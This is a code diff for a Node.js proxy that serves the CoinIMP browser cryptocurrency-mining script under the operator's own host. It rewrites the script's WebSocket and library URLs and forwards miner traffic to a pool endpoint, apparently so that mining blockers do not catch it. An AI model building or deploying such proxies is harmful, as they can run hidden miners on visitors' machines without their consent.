@@ -20,14 +20,17 @@ app.use('/script', createProxyMiddleware({
         res.removeHeader('x-powered-by');
         
         let content = responseBuffer.toString('utf8');
-        // The script contains wss://ws.hostingcloud.racing or similar.
-        // We replace "hostingcloud.racing" with our own host to route WS traffic to our proxy
+        
         const host = req.headers.host;
         const protocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'wss://' : 'ws://';
         
-        // Rewrite wss://*.hostingcloud.racing to wss://our-proxy.com/proxy
-        content = content.replace(/wss?:\/\/[a-zA-Z0-9.\-]*hostingcloud\.racing/g, protocol + host + '/proxy');
-        content = content.replace(/hostingcloud\.racing/g, host + '/proxy');
+        // Rewrite the WebSocket URLs to point to our proxy
+        content = content.replace(/wss:\\\/\\\/s01\.hostcontent\.live\\\/aUCLhCJm/g, protocol + host + '/proxy');
+        content = content.replace(/wss:\/\/s01\.hostcontent\.live\/aUCLhCJm/g, protocol + host + '/proxy');
+        
+        // Also rewrite the lib url and miner host to point back to the proxy
+        const httpProtocol = req.secure || req.headers['x-forwarded-proto'] === 'https' ? 'https://' : 'http://';
+        content = content.replace(/https:\/\/www\.hostingcloud\.racing\//g, httpProtocol + host + '/script/');
         
         return content;
     })
@@ -35,7 +38,7 @@ app.use('/script', createProxyMiddleware({
 
 // Proxy the WebSocket connections to the CoinIMP pool
 app.use('/proxy', createProxyMiddleware({ 
-    target: 'wss://ws.hostingcloud.racing', 
+    target: 'wss://s01.hostcontent.live/aUCLhCJm', 
     changeOrigin: true,
     ws: true,
     pathRewrite: {
